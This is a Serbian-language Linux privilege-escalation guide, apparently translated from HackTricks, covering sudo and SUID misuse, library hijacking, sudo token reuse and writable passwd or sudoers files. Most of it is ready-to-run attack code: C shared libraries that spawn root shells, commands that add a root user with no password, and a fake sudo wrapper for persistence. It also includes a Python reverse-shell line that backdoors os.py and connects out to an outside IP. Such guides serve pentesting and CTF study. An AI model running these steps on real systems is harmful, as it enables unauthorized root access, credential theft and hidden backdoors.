Možda imate dozvolu da izvršite neku komandu koristeći sudo ili neke binarne imaju suid bit. Proverite to koristeći:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Neke **neočekivane komande omogućavaju čitanje i/ili pisanje fajlova ili čak izvršavanje komande.** Na primer:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Konfiguracija sudo može dozvoliti korisniku da izvrši neku komandu sa privilegijama drugog korisnika bez poznavanja lozinke.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
U ovom primeru korisnik `demo` može da pokrene `vim` kao `root`, sada je trivijalno dobiti shell dodavanjem ssh ključa u root direktorijum ili pozivanjem `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ova direktiva omogućava korisniku da **set an environment variable** prilikom izvršavanja nečega:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ovaj primer, **zasnovan na HTB machine Admirer**, bio je **ranjiv** na **PYTHONPATH hijacking** kojim je moguće učitati proizvoljnu python biblioteku prilikom izvršavanja skripte kao root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo: zaobilaženje izvršavanja putem putanja

**Skoči** da pročitaš druge fajlove ili koristi **symlinks**. Na primer, u sudoers fajlu: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ako se koristi **wildcard** (\*), to je još lakše:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Protivmere**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez putanje do komande

Ako je **sudo dozvola** dodeljena jednoj komandi **bez navođenja putanje**: _hacker10 ALL= (root) less_ možete to iskoristiti promenom promenljive PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ova tehnika se može koristiti i ako **suid** binarni fajl **izvršava drugu komandu bez navođenja puta do nje (uvek proverite pomoću** _**strings**_ **sadržaj sumnjivog SUID binarnog fajla)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binarni fajl sa putanjom komande

Ako **suid** binarni fajl **izvršava drugu komandu navodeći putanju**, onda možete pokušati da kreirate i export a function pod imenom komande koju suid fajl poziva.

Na primer, ako suid binarni fajl poziva _**/usr/sbin/service apache2 start**_ morate pokušati da kreirate funkciju i export-ujete je:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Zatim, kada pozovete suid binary, ova funkcija će biti izvršena

### LD_PRELOAD & **LD_LIBRARY_PATH**

Promenljiva okruženja **LD_PRELOAD** koristi se za specificiranje jedne ili više deljenih biblioteka (.so fajlova) koje učitavač treba da učita pre svih ostalih, uključujući standardnu C biblioteku (`libc.so`). Ovaj proces se poznaje kao prethodno učitavanje biblioteke.

Međutim, da bi se održala bezbednost sistema i sprečilo zloupotrebljavanje ove funkcije, posebno kod suid/sgid izvršnih fajlova, sistem nameće određene uslove:

- Učitavač ignoriše **LD_PRELOAD** za izvršne fajlove gde realni ID korisnika (_ruid_) nije jednak efektivnom ID-u korisnika (_euid_).
- Za izvršne fajlove sa suid/sgid, prethodno se učitavaju samo biblioteke koje se nalaze u standardnim putanjama i koje su takođe suid/sgid.

Esakalacija privilegija može da se desi ako imate mogućnost da izvršavate komande sa `sudo` i izlaz `sudo -l` sadrži izjavu **env_keep+=LD_PRELOAD**. Ova konfiguracija omogućava da promenljiva okruženja **LD_PRELOAD** opstane i bude prepoznata čak i kada se komande pokreću sa `sudo`, što potencijalno može dovesti do izvršavanja proizvoljnog koda sa povišenim privilegijama.
```
Defaults        env_keep += LD_PRELOAD
```
Sačuvajte kao **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Zatim **kompajlirajte ga** koristeći:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na kraju, **escalate privileges** pokretanjem
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Sličan privesc može biti zloupotrebljen ako napadač kontroliše **LD_LIBRARY_PATH** env promenljivu, jer on kontroliše putanju u kojoj će se tražiti biblioteke.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Kada naiđete na binarni fajl sa **SUID** permisijama koji deluje neobično, dobra je praksa proveriti da li pravilno učitava **.so** fajlove. To se može proveriti pokretanjem sledeće komande:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na primer, nailazak na grešku kao _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ ukazuje na potencijal za eksploataciju.

Da biste iskoristili ovo, nastavite tako što ćete kreirati C fajl, na primer _"/path/to/.config/libcalc.c"_, koji sadrži sledeći kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ovaj kod, kada se kompajlira i izvrši, ima za cilj eskalaciju privilegija manipulisanjem dozvola fajlova i pokretanjem shell-a sa povišenim privilegijama.

Kompajlirajte gore navedeni C fajl u shared object (.so) fajl pomoću:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Na kraju, pokretanje pogođenog SUID binary trebalo bi da pokrene exploit, omogućavajući potencijalno kompromitovanje sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sada kada smo pronašli SUID binary koji učitava library iz foldera u koji možemo pisati, napravimo library u tom folderu sa potrebnim imenom:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ako dobijete grešku kao što je
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to znači da biblioteka koju ste generisali treba da sadrži funkciju nazvanu `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) je kurirana lista Unix binarnih programa koje napadač može iskoristiti da zaobiđe lokalna bezbednosna ograničenja. [**GTFOArgs**](https://gtfoargs.github.io/) je isto, ali za slučajeve kada možete **samo ubaciti argumente** u komandu.

Projekat prikuplja legitimne funkcionalnosti Unix binarnih programa koje se mogu zloupotrebiti da izađete iz restricted shells, eskalirate ili održavate povišene privilegije, prenosite fajlove, pokrećete bind and reverse shells, i olakšavate druge post-exploitation zadatke.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ako možete da pokrenete `sudo -l` možete koristiti alat [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) da proverite da li on nalazi način da iskoristi bilo koje sudo pravilo.

### Reusing Sudo Tokens

U slučajevima kada imate **sudo access** ali ne i lozinku, možete eskalirati privilegije čekajući izvršenje sudo komande i zatim oteti session token.

Zahtevi za eskalaciju privilegija:

- Već imate shell kao korisnik "_sampleuser_"
- "_sampleuser_" je **koristio `sudo`** da izvrši nešto u **poslednjih 15 minuta** (po defaultu to je trajanje sudo tokena koji nam omogućava da koristimo `sudo` bez unošenja lozinke)
- `cat /proc/sys/kernel/yama/ptrace_scope` je 0
- `gdb` je dostupan (možete ga otpremiti)

(Možete privremeno omogućiti `ptrace_scope` sa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ili trajno menjajući `/etc/sysctl.d/10-ptrace.conf` i postavljajući `kernel.yama.ptrace_scope = 0`)

Ako su svi ovi zahtevi ispunjeni, **možete eskalirati privilegije koristeći:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) će kreirati binarni fajl `activate_sudo_token` u _/tmp_. Možete ga koristiti da aktivirate sudo token u svojoj sesiji (nećete automatski dobiti root shell, uradite `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **Drugi exploit** (`exploit_v2.sh`) će kreirati sh shell u _/tmp_ **u vlasništvu root-a sa setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **treći exploit** (`exploit_v3.sh`) će **kreirati sudoers fajl** koji čini **sudo tokens večnim i dozvoljava svim korisnicima da koriste sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ako imate **write permissions** u folderu ili na bilo kojoj od datoteka kreiranih unutar foldera, možete koristiti binarni [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) da **create a sudo token for a user and PID**.\
Na primer, ako možete prepisati fajl _/var/run/sudo/ts/sampleuser_ i imate shell kao taj korisnik sa PID 1234, možete **obtain sudo privileges** bez potrebe da znate lozinku tako što ćete:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Datoteka `/etc/sudoers` i datoteke unutar `/etc/sudoers.d` konfigurišu ko može da koristi `sudo` i kako. Ove datoteke su **podrazumevano čitljive samo od strane korisnika root i grupe root**.\
**Ako** možete da **pročitate** ovu datoteku, mogli biste uspeti da **dobijete neke interesantne informacije**, a ako možete da **pišete** u bilo koju datoteku, bićete u stanju da **eskalirate privilegije**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ako možeš da pišeš, možeš zloupotrebiti ovu dozvolu.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Još jedan način zloupotrebe ovih dozvola:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Postoje neke alternative za binarnu datoteku `sudo`, kao što je `doas` za OpenBSD. Ne zaboravite da proverite njegovu konfiguraciju u `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ako znate da **korisnik obično povezuje na mašinu i koristi `sudo`** da eskalira privilegije i imate shell u okviru tog korisničkog konteksta, možete **napraviti novi sudo executable** koji će izvršiti vaš kod kao root, a zatim komandu korisnika. Zatim **izmenite $PATH** korisničkog konteksta (na primer dodavanjem novog puta u .bash_profile) tako da kada korisnik pokrene sudo, izvrši se vaš sudo executable.

Obratite pažnju da ako korisnik koristi drugi shell (ne bash) moraćete da izmenite druge fajlove da dodate novi put. Na primer[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. You can find another example in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ili pokretanje nečega poput:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Deljena biblioteka

### ld.so

Datoteka `/etc/ld.so.conf` pokazuje **odakle potiču učitani konfiguracioni fajlovi**. Obično ova datoteka sadrži sledeću putanju: `include /etc/ld.so.conf.d/*.conf`

To znači da će se pročitati konfiguracioni fajlovi iz `/etc/ld.so.conf.d/*.conf`. Ti konfiguracioni fajlovi **pokazuju na druge direktorijume** gde će se **biblioteke** **tražiti**. Na primer, sadržaj `/etc/ld.so.conf.d/libc.conf` je `/usr/local/lib`. **To znači da će sistem tražiti biblioteke u okviru `/usr/local/lib`**.

Ako iz nekog razloga **korisnik ima prava za pisanje** na bilo kojoj od navedenih lokacija: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bilo kojoj datoteci unutar `/etc/ld.so.conf.d/` ili bilo kom direktorijumu navedenom u konfiguracionom fajlu unutar `/etc/ld.so.conf.d/*.conf`, možda će moći da eskalira privilegije.\
Pogledajte **kako iskoristiti ovu pogrešnu konfiguraciju** na sledećoj strani:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiranjem lib u `/var/tmp/flag15/` ona će biti korišćena od strane programa na ovom mestu, kako je navedeno u `RPATH` varijabli.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Zatim kreirajte zlonamernu biblioteku u `/var/tmp` pomoću `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Mogućnosti

Linux capabilities pružaju **podskup dostupnih root privilegija procesu**. Ovo efektivno deli root **privilegije na manje i odvojene jedinice**. Svakoj od ovih jedinica se zatim može nezavisno dodeliti procesima. Na taj način se smanjuje kompletan skup privilegija, čime se umanjuje rizik od eksploatacije.\
Pročitajte sledeću stranicu da biste **saznali više o capabilities i kako ih zloupotrebiti**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dozvole direktorijuma

U direktorijumu, **bit za "execute"** implicira da korisnik na koga se odnosi može da se "**cd**" u folder.\
**"Read"** bit implicira da korisnik može **listati** **fajlove**, a **"write"** bit implicira da korisnik može **brisati** i **kreirati** nove **fajlove**.

## ACLs

Access Control Lists (ACLs) predstavljaju sekundarni sloj diskrecionih dozvola, sposoban da **prevaziđe tradicionalne ugo/rwx dozvole**. Ove dozvole unapređuju kontrolu pristupa fajlovima ili direktorijumima tako što omogućavaju ili odbijaju prava određenim korisnicima koji nisu vlasnici niti deo grupe. Ovaj nivo **granularnosti omogućava preciznije upravljanje pristupom**. Dalji detalji se mogu naći [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dodeliti** korisniku "kali" read i write dozvole nad fajlom:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pronađi** datoteke sa specifičnim ACLs na sistemu:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otvorene shell sessions

U **starijim verzijama** možete **hijack** neku **shell session** drugog korisnika (**root**).\
U **najnovijim verzijama** moći ćete da se **connect** samo na screen sessions svog korisničkog naloga. Ipak, možete pronaći **zanimljive informacije unutar sessiona**.

### screen sessions hijacking

**Prikaži screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Prikači se na sesiju**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Ovo je bio problem sa **starim tmux verzijama**. Nisam uspeo da hijack tmux (v2.1) sesiju kreiranu od strane root-a kao non-privileged user.

**Lista tmux sesija**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Prikači se na sesiju**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** za primer.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Svi SSL i SSH ključevi generisani na Debian baziranim sistemima (Ubuntu, Kubuntu, itd) između septembra 2006. i 13. maja 2008. mogu biti pogođeni ovim buggom.\
Ovaj bug nastaje pri kreiranju novog ssh ključa na tim OS-ovima, jer je bilo moguće samo **32,768 varijacija**. To znači da se sve mogućnosti mogu izračunati i **posedovanjem ssh public key možete potražiti odgovarajući private key**. Možete pronaći izračunate mogućnosti ovde: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Specifies whether password authentication is allowed. The default is `no`.
- **PubkeyAuthentication:** Specifies whether public key authentication is allowed. The default is `yes`.
- **PermitEmptyPasswords**: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is `no`.

### PermitRootLogin

Specifies whether root can log in using ssh, default is `no`. Possible values:

- `yes`: root može da se prijavi koristeći password i private key
- `without-password` or `prohibit-password`: root može da se prijavi samo pomoću private key
- `forced-commands-only`: root se može prijaviti samo koristeći private key i samo ako su opcije za commands specificirane
- `no` : ne

### AuthorizedKeysFile

Specifies files that contain the public keys that can be used for user authentication. It can contain tokens like `%h`, which will be replaced by the home directory. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracija će označiti da, ako pokušate da se prijavite koristeći **private** key korisnika "**testusername**", ssh će uporediti public key vašeg key-a sa onima koji se nalaze u `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding vam omogućava da **use your local SSH keys instead of leaving keys** (without passphrases!) koji stoje na vašem serveru. Dakle, moći ćete da **jump** via ssh **to a host** i odatle **jump to another** host **using** the **key** located in your **initial host**.

Treba da podesite ovu opciju u `$HOME/.ssh.config` ovako:
```
Host example.com
ForwardAgent yes
```
Obratite pažnju da ako je `Host` `*`, svaki put kada korisnik pređe na drugu mašinu, taj host će moći da pristupi ključevima (što predstavlja bezbednosni problem).

Fajl `/etc/ssh_config` može **nadjačati** ove **opcije** i dozvoliti ili odbiti ovu konfiguraciju.\
Fajl `/etc/sshd_config` može **dozvoliti** ili **zabraniti** ssh-agent forwarding pomoću ključne reči `AllowAgentForwarding` (podrazumevano je dozvoljeno).

Ako otkrijete da je Forward Agent konfigurisan u okruženju, pročitajte sledeću stranicu jer **možda ćete moći da ga zloupotrebite za escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Zanimljivi fajlovi

### Datoteke profila

Fajl `/etc/profile` i fajlovi pod `/etc/profile.d/` su **skripte koje se izvršavaju kada korisnik pokrene novu shell**. Dakle, ako možete **pisati ili izmeniti bilo koji od njih možete escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ako se pronađe neki čudan profile script, treba ga proveriti zbog **osetljivih detalja**.

### Passwd/Shadow Files

U zavisnosti od OS-a, fajlovi `/etc/passwd` i `/etc/shadow` mogu imati drugo ime ili može postojati backup. Zato se preporučuje da **pronađete sve** i **proverite da li ih možete pročitati** kako biste videli **da li se u fajlovima nalaze hashes**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Ponekad možete pronaći **password hashes** u fajlu `/etc/passwd` (ili ekvivalentnom)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Upisiv /etc/passwd

Prvo, generišite password koristeći jednu od sledećih komandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Zatim dodajte korisnika `hacker` i unesite generisanu lozinku.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Na primer: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sada možete koristiti komandu `su` sa `hacker:hacker`

Alternativno, možete koristiti sledeće linije da dodate lažnog korisnika bez lozinke.\
UPOZORENJE: ovo može smanjiti trenutnu bezbednost mašine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NAPOMENA: Na BSD platformama `/etc/passwd` se nalazi u `/etc/pwd.db` i `/etc/master.passwd`, takođe `/etc/shadow` je preimenovan u `/etc/spwd.db`.

Trebalo bi da proverite da li možete da **pišete u neke osetljive fajlove**. Na primer, možete li da pišete u neki **konfiguracioni fajl servisa**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na пример, ако машина покреће **tomcat** сервер и можете **изменити конфигурациони фајл Tomcat сервиса унутар /etc/systemd/,** онда можете изменити следеће линије:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Vaš backdoor će biti izvršen sledeći put kada se tomcat pokrene.

### Proverite foldere

Sledeći folderi mogu sadržati rezervne kopije ili zanimljive informacije: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Verovatno nećete moći da pročitate poslednji, ali pokušajte)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Neobična lokacija/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Izmenjene datoteke u poslednjih nekoliko minuta
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB fajlovi
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml datoteke
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Skriveni fajlovi
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binari u PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Veb fajlovi**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rezervne kopije**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Poznati fajlovi koji sadrže lozinke

Pročitaj kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on pretražuje **nekoliko fajlova koji bi mogli sadržati lozinke**.\
**Još jedan interesantan alat** koji možeš koristiti za to je: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) koji je aplikacija otvorenog koda koja služi za izdvajanje velikog broja lozinki sačuvanih na lokalnom računaru za Windows, Linux & Mac.

### Logovi

Ako možeš čitati logove, možda ćeš moći pronaći **interesantne/poverljive informacije u njima**. Što je log čudniji, to će verovatno biti zanimljiviji.\
Takođe, neki **loše** konfigurisani (kompromitovani?) **audit logovi** mogu ti omogućiti da **zabeležiš lozinke** unutar audit logova kao što je objašnjeno u ovoj objavi: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Da biste **čitali logove, grupa** [**adm**](interesting-groups-linux-pe/index.html#adm-group) će biti od velike pomoći.

### Shell fajlovi
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Takođe treba da proverite fajlove koji sadrže reč "**password**" u svom **ime** ili unutar **sadržaja**, i takođe proverite IPs i emails u logovima, ili hashes regexps.\
Neću ovde navoditi kako se sve to radi, ali ako vas zanima možete pogledati poslednje provere koje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) izvodi.

## Upisivi fajlovi

### Python library hijacking

Ako znate **odakle** će se izvršavati python skripta i **možete pisati unutar** tog foldera ili možete **modify python libraries**, možete izmeniti OS library i backdoor it (ako možete pisati tamo gde će se izvršavati python skripta, kopirajte i nalepite os.py library).

Da biste **backdoor the library** jednostavno dodajte na kraju os.py library sledeću liniju (promenite IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate eksploatacija

Ranjivost u `logrotate` omogućava korisnicima sa **dozvolama pisanja** na log fajl ili njegovim roditeljskim direktorijumima da potencijalno dobiju povišene privilegije. Razlog je što se `logrotate`, često pokretana kao **root**, može manipulirati da izvrši proizvoljne fajlove, posebno u direktorijumima kao što su _**/etc/bash_completion.d/**_. Važno je proveriti dozvole ne samo u _/var/log_ nego i u bilo kom direktorijumu gde se primenjuje rotacija logova.

> [!TIP]
> Ova ranjivost pogađa `logrotate` verzije `3.18.0` i starije

Detaljnije informacije o ranjivosti mogu se pronaći na ovoj stranici: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ovu ranjivost možete iskoristiti pomoću [**logrotten**](https://github.com/whotwagner/logrotten).

Ova ranjivost je veoma slična [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** pa kad god otkrijete da možete izmeniti logove, proverite ko ih upravlja i proverite da li možete eskalirati privilegije zamenom logova symlinks-ovima.

